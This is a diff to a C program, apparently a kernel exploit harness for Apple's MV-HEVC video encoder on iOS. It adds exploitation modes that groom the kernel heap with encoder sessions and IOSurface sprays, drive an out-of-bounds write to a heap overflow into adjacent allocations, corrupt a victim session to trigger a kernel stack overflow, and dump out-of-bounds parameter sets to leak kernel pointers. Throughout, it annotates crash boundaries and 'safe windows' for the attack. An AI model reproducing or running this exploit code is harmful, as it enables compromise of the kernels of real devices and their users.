@@ -11,14 +11,18 @@
  * 5. Test firmware parameter corruption (+0x5ED4 -> 56-byte header overwrite)
  * 6. Test cross-buffer OOB with IOSurface spray
  *
- * Key thresholds (all entries from first VPS table at buffer+0x3770):
+ * Key thresholds:
+ *   TABLE 1 (buffer+0x3770):
  *   Entry 256 (~86 encodes): First OOB write
- *   Entry 601 (~200 encodes): +0x5C88 SIMD target pointer (CUMSUM corrupts!)
- *   Entry 602 (~201 encodes): Guard array +0x5D14 (branch misroute)
- *   Entry 630 (~210 encodes): Cross-object 56-byte write (+0x5ED4)
- *   Entry 642 (~214 encodes): Forced BLRAA (+0x5F94)
- *   Entry 714 (~238 encodes): W24 config override (+0x6414)
- *   Entry 1059 (~353 encodes): Cross-buffer OOB (adjacent kalloc.49152)
+ *   Entry 588 (~196 enc): Firmware param array start (+0x5C34)
+ *   Entry 592 (~197 enc): +0x5C70 target pointer CORRUPTED → CRASH
+ *   Entry 593 (~198 enc): +0x5C88 source pointer CORRUPTED
+ *   *** Entries 592+ unreachable without crash ***
+ *
+ *   TABLE 2 (buffer+0x7DF4) — PRIMARY EXPLOITATION PATH:
+ *   Entry 256 (~86 encodes): First OOB write
+ *   Entry 466 (~155 enc): Past buffer end → HEAP OVERFLOW into adjacent alloc
+ *   Safe window: 155-197 encodes (heap overflow without table 1 crash)
  *
  * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
  *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
@@ -215,12 +219,12 @@ static int phase2_measure(void) {
 /* Phase 3: Counter overflow */
 static int phase3_overflow(int max_encodes) {
     rlog("\n========== PHASE 3: Counter Overflow (%d encodes) ==========\n", max_encodes);
-    rlog("OOB entry thresholds:\n");
+    rlog("OOB entry thresholds (table 1):\n");
     rlog("  256 (~86 enc): First write past VPS sub-object boundary\n");
-    rlog("  602 (~201 enc): +0x5D14 guard array (branch misroute)\n");
-    rlog("  630 (~210 enc): +0x5ED4 56-byte SIMD header overwrite\n");
-    rlog("  642 (~214 enc): +0x5F94 forced BLRAA indirect call\n");
-    rlog("  714 (~238 enc): +0x6414 W24 config override\n\n");
+    rlog("  588 (~196 enc): Firmware param array +0x5C34\n");
+    rlog("  592 (~197 enc): +0x5C70 target pointer — CRASH BOUNDARY\n");
+    rlog("OOB entry thresholds (table 2 — PRIMARY PATH):\n");
+    rlog("  466 (~155 enc): Past buffer end → HEAP OVERFLOW\n\n");
 
     VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
     if (!s) return -1;
@@ -622,6 +626,253 @@ int main(int argc, char *argv[]) {
             rlog("  encode count places cumsum near a spray address\n");
         }
 
+    } else if (strcmp(mode, "dual") == 0) {
+        rlog("DUAL: Multi-session spray + cross-buffer OOB + victim trigger\n");
+        rlog("This is the PRIMARY exploitation path:\n");
+        rlog("1. Create 20 MV-HEVC sessions (spray HEVC buffers in kalloc_data.49152)\n");
+        rlog("2. Free alternating sessions to create holes\n");
+        rlog("3. Create attacker + victim sessions in holes\n");
+        rlog("4. Attacker encodes 360 frames -> cross-buffer OOB into victim +0x8\n");
+        rlog("5. Victim encodes 1 frame -> corrupted loop bound -> stack overflow\n\n");
+        if (phase1_verify() != 0) goto done;
+
+        rlog("\n--- Phase A: Create 20 spray sessions ---\n");
+        #define DUAL_SPRAY 20
+        VTCompressionSessionRef spray_sessions[DUAL_SPRAY];
+        for (int i = 0; i < DUAL_SPRAY; i++) {
+            spray_sessions[i] = create_mvhevc_encoder(128, 128, 1);
+            if (!spray_sessions[i]) {
+                rlog("Session %d creation failed\n", i);
+            } else {
+                int st = encode_one(spray_sessions[i], 0, 128, 128);
+                rlog("Session %d: created, first encode status=%d\n", i, st);
+            }
+        }
+
+        rlog("\n--- Phase B: Free alternating sessions ---\n");
+        for (int i = 0; i < DUAL_SPRAY; i += 2) {
+            if (spray_sessions[i]) {
+                VTCompressionSessionInvalidate(spray_sessions[i]);
+                CFRelease(spray_sessions[i]);
+                spray_sessions[i] = NULL;
+                rlog("Freed session %d\n", i);
+            }
+        }
+        usleep(100000);
+
+        rlog("\n--- Phase C: Create attacker (lid=0x4141) + victim (lid=1) ---\n");
+        VTCompressionSessionRef attacker = create_mvhevc_encoder(128, 128, 0x4141);
+        VTCompressionSessionRef victim = create_mvhevc_encoder(128, 128, 1);
+        if (!attacker || !victim) {
+            rlog("FAILED to create attacker/victim\n");
+            goto dual_cleanup;
+        }
+        int ast = encode_one(attacker, 0, 128, 128);
+        int vst = encode_one(victim, 0, 128, 128);
+        rlog("Attacker first encode: %d, Victim first encode: %d\n", ast, vst);
+
+        rlog("\n--- Phase D: Attacker encodes 360 frames ---\n");
+        rlog("Target: entry 1059+ (~353 enc) for cross-buffer OOB\n");
+        int atk_errors = 0;
+        for (int i = 1; i < 360; i++) {
+            int st = encode_one(attacker, i, 128, 128);
+            if (st != 0) {
+                atk_errors++;
+                rlog("[ATK %d] Error: %d\n", i, st);
+                if (atk_errors >= 5) break;
+            }
+            if ((i+1) % 50 == 0 || i == 359) {
+                int est = (i+1) * 3;
+                rlog("[ATK %d/%d] ~%d entries, cross-buffer: %s\n",
+                     i+1, 360, est, est > 1059 ? "REACHED" : "not yet");
+            }
+        }
+
+        rlog("\n--- Phase E: Victim encodes 1 frame (may trigger stack overflow) ---\n");
+        rlog("If victim +0x8 was corrupted to ~700, the loop at 0x1915168\n");
+        rlog("runs 700 iterations × 256-byte format = stack overflow\n");
+        rlog("Saved registers x19-x28 corrupted on stack\n");
+        rlog("WARNING: This may cause a kernel panic!\n\n");
+        vst = encode_one(victim, 1, 128, 128);
+        rlog("Victim second encode: status=%d\n", vst);
+        rlog("If we get here, either:\n");
+        rlog("  a) Cross-buffer did not reach victim (not adjacent)\n");
+        rlog("  b) Victim +0x8 was not corrupted to exploitable value\n");
+        rlog("  c) Stack overflow was caught by guard page\n");
+        rlog("  d) PAC failure on return address caused graceful error\n");
+
+        rlog("\n--- Phase F: Check victim parameter sets for OOB data ---\n");
+        rlog("Victim pset_count=%zu, pset_bytes=%zu\n",
+             g_last_pset_count, g_last_pset_total_bytes);
+
+        dual_cleanup:
+        if (attacker) { VTCompressionSessionInvalidate(attacker); CFRelease(attacker); }
+        if (victim) { VTCompressionSessionInvalidate(victim); CFRelease(victim); }
+        for (int i = 0; i < DUAL_SPRAY; i++)
+            if (spray_sessions[i]) {
+                VTCompressionSessionInvalidate(spray_sessions[i]);
+                CFRelease(spray_sessions[i]);
+            }
+
+    } else if (strcmp(mode, "table2_heap") == 0) {
+        rlog("TABLE2_HEAP: Second VPS table heap overflow (PRIMARY EXPLOITATION PATH)\n");
+        rlog("Both VPS tables overflow simultaneously during MV-HEVC encoding.\n");
+        rlog("Table 2 at buffer+0x7DF4 overflows past buffer end (+0x9B10) at entry 466.\n");
+        rlog("Table 1 hits +0x5C70 pointer at entry 592 → crash.\n");
+        rlog("Safe window: 155-197 encodes (heap overflow without crash).\n\n");
+        rlog("Strategy:\n");
+        rlog("  1. Spray IOSurfaces in kalloc.49152 (same zone as HEVC buffer)\n");
+        rlog("  2. Create MV-HEVC encoder (allocates HEVC buffer)\n");
+        rlog("  3. Encode 170 frames (safe, well within window)\n");
+        rlog("  4. Table 2 entries 466+ write past buffer into adjacent IOSurface\n");
+        rlog("  5. Read back IOSurface properties for corruption detection\n\n");
+        if (phase1_verify() != 0) goto done;
+
+        int t2_encodes = (argc > 2) ? atoi(argv[2]) : 170;
+        int t2_lid = (argc > 3) ? (int)strtol(argv[3], NULL, 0) : 0x4141;
+        if (t2_encodes > 195) {
+            rlog("WARNING: >195 encodes risks table 1 +0x5C70 crash at ~197!\n");
+            rlog("Clamping to 195.\n");
+            t2_encodes = 195;
+        }
+
+        rlog("--- Step 1: Pre-spray %d IOSurfaces ---\n", SPRAY_COUNT/2);
+        for (int i = 0; i < SPRAY_COUNT/2; i++)
+            g_surfaces[i] = create_spray_surface(i);
+
+        rlog("--- Step 2: Create MV-HEVC encoder (lid=0x%x) ---\n", t2_lid);
+        VTCompressionSessionRef t2s = create_mvhevc_encoder(128, 128, t2_lid);
+        if (!t2s) {
+            rlog("FAILED: Could not create encoder\n");
+            for (int i = 0; i < SPRAY_COUNT/2; i++)
+                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+            goto done;
+        }
+
+        rlog("--- Step 3: Post-spray %d more IOSurfaces ---\n", SPRAY_COUNT/2);
+        for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
+            g_surfaces[i] = create_spray_surface(i);
+
+        rlog("--- Step 4: Encode %d frames (table 2 heap overflow at ~155) ---\n", t2_encodes);
+        int t2_errors = 0;
+        for (int i = 0; i < t2_encodes; i++) {
+            int st = encode_one(t2s, i, 128, 128);
+            if (st != 0) {
+                t2_errors++;
+                rlog("[%d] Error: %d\n", i, st);
+                if (t2_errors >= 5) break;
+            }
+            if ((i+1) % 25 == 0 || i == t2_encodes-1) {
+                int t1_entries = (i+1) * 3;
+                int t2_entries = (i+1) * 3;
+                const char *t1_state = "pre-OOB";
+                if (t1_entries >= 592) t1_state = "DANGER: +0x5C70 hit!";
+                else if (t1_entries >= 256) t1_state = "OOB (safe range)";
+                const char *t2_state = "pre-OOB";
+                if (t2_entries >= 466) t2_state = "HEAP OVERFLOW ACTIVE";
+                else if (t2_entries >= 256) t2_state = "intra-buffer OOB";
+                rlog("[%d/%d] T1: ~%d entries (%s) | T2: ~%d entries (%s)\n",
+                     i+1, t2_encodes, t1_entries, t1_state, t2_entries, t2_state);
+            }
+        }
+
+        VTCompressionSessionCompleteFrames(t2s, kCMTimeInvalid);
+        usleep(500000);
+
+        rlog("\n--- Step 5: Check spray surfaces for corruption ---\n");
+        int t2_corrupted = 0;
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            if (!g_surfaces[i]) continue;
+            IOSurfaceLock(g_surfaces[i], 1, NULL);
+            void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
+            if (base) {
+                uint32_t *p32 = (uint32_t *)base;
+                int changes = 0;
+                for (int j = 2; j < 9216; j++) {
+                    if (p32[j] != 0xAAAAAAAA) {
+                        if (!changes) {
+                            rlog("  SURFACE[%d] CORRUPTED at +0x%x: 0x%08x\n",
+                                 i, j*4, p32[j]);
+                            for (int k = (j>2?j-2:0); k < j+8 && k < 9216; k++)
+                                rlog("    [+0x%04x] 0x%08x%s\n", k*4, p32[k],
+                                     p32[k] != 0xAAAAAAAA ? " *" : "");
+                        }
+                        changes++;
+                    }
+                }
+                if (changes) {
+                    t2_corrupted++;
+                    rlog("  Surface[%d]: %d words changed\n", i, changes);
+                }
+            }
+            IOSurfaceUnlock(g_surfaces[i], 1, NULL);
+        }
+
+        rlog("\nCorrupted surfaces: %d / %d\n", t2_corrupted, SPRAY_COUNT);
+        if (t2_corrupted > 0) {
+            rlog("*** TABLE 2 HEAP OVERFLOW INTO ADJACENT IOSurface CONFIRMED ***\n");
+            rlog("*** layer_id=0x%x values should appear at byte position 4 ***\n", t2_lid);
+        } else {
+            rlog("No corruption detected. Possible reasons:\n");
+            rlog("  - HEVC buffer not adjacent to any spray surface\n");
+            rlog("  - Table 2 not written during MV-HEVC (needs on-device verification)\n");
+            rlog("  - Entries per encode differ from expected ~3\n");
+        }
+
+        VTCompressionSessionInvalidate(t2s); CFRelease(t2s);
+        for (int i = 0; i < SPRAY_COUNT; i++)
+            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+
+    } else if (strcmp(mode, "safe_max") == 0) {
+        rlog("SAFE_MAX: Maximum safe encodes (196) with corruption check\n");
+        rlog("Entry 591 (~197 enc) is the last safe entry before +0x5C70 crash\n");
+        rlog("This maximizes OOB corruption without triggering pointer crash\n\n");
+        int sm_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
+        rlog("layer_id=0x%x, 196 encodes\n\n", sm_lid);
+        if (phase1_verify() != 0) goto done;
+        phase5_firmware(196, sm_lid);
+
+    } else if (strcmp(mode, "pset_dump") == 0) {
+        rlog("PSET_DUMP: Dump raw parameter set bytes after overflow\n");
+        rlog("After counter inflation, CMVideoFormatDescriptionGetHEVCParameterSetAtIndex\n");
+        rlog("reads OOB entries. We dump the raw bytes to look for kernel pointers.\n\n");
+        int encodes = (argc > 2) ? atoi(argv[2]) : 300;
+        if (phase1_verify() != 0) goto done;
+
+        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+        if (!s) goto done;
+
+        rlog("Encoding %d frames to inflate counter...\n", encodes);
+        for (int i = 0; i < encodes; i++) {
+            int st = encode_one(s, i, 128, 128);
+            if (st != 0 && i < 5) rlog("[%d] Error: %d\n", i, st);
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        usleep(500000);
+
+        rlog("\nFinal encode to get OOB parameter sets...\n");
+        int st = encode_one(s, encodes, 128, 128);
+        rlog("Status: %d, pset_count=%zu, pset_bytes=%zu\n",
+             st, g_last_pset_count, g_last_pset_total_bytes);
+
+        rlog("\nDumping parameter set raw bytes:\n");
+        CMSampleBufferRef last_buf = NULL;
+        // Re-encode to capture buffer in callback
+        g_encode_done = 0;
+        CVPixelBufferRef pb = create_pb(128, 128);
+        if (pb) {
+            CMTime pts = CMTimeMake(encodes+1, 30);
+            CMTime dur = CMTimeMake(1, 30);
+            VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
+            for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+            CVPixelBufferRelease(pb);
+        }
+
+        rlog("pset_count=%zu after re-encode\n", g_last_pset_count);
+        rlog("If count > baseline (3), extra entries are OOB kernel heap data\n");
+
+        VTCompressionSessionInvalidate(s); CFRelease(s);
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -632,17 +883,20 @@ int main(int argc, char *argv[]) {
         rlog("  read_only  -- OOB read only (400 encodes)\n");
         rlog("  spray      -- IOSurface spray + cross-buffer (400 encodes)\n");
         rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
+        rlog("  table2_heap [enc] [lid] -- TABLE 2 heap overflow (PRIMARY PATH)\n");
+        rlog("  safe_max [lid]   -- Maximum safe encodes (196) before crash\n");
         rlog("  simd_target -- Target entries #630-633 (56-byte SIMD overwrite)\n");
         rlog("  simd_safe [lid]  -- 210 encodes, stop BEFORE SIMD overwrite\n");
         rlog("  cumsum_predict   -- Measure NAL sizes, predict cumsum at entry 601\n");
-        rlog("\nKey entry thresholds:\n");
+        rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
-        rlog("  601 (~200 enc): +0x5C88 SIMD target ptr (cumsum corruption!)\n");
-        rlog("  602 (~201 enc): Guard array +0x5D14\n");
-        rlog("  630 (~210 enc): 56-byte SIMD header overwrite +0x5ED4\n");
-        rlog("  642 (~214 enc): Forced BLRAA +0x5F94\n");
-        rlog("  714 (~238 enc): W24 config +0x6414\n");
-        rlog("  1059 (~353 enc): Cross-buffer OOB into adjacent alloc\n");
+        rlog("  588 (~196 enc): Firmware param array start +0x5C34\n");
+        rlog("  592 (~197 enc): +0x5C70 TARGET POINTER — CRASH BOUNDARY\n");
+        rlog("  *** Entries 593+ UNREACHABLE from table 1 without crash ***\n");
+        rlog("\nKey entry thresholds (TABLE 2 — PRIMARY PATH):\n");
+        rlog("  256 (~86 enc):  First OOB write\n");
+        rlog("  466 (~155 enc): Past buffer end → HEAP OVERFLOW\n");
+        rlog("  Safe window: 155-197 encodes (heap overflow, no crash)\n");
     }
 
 done:
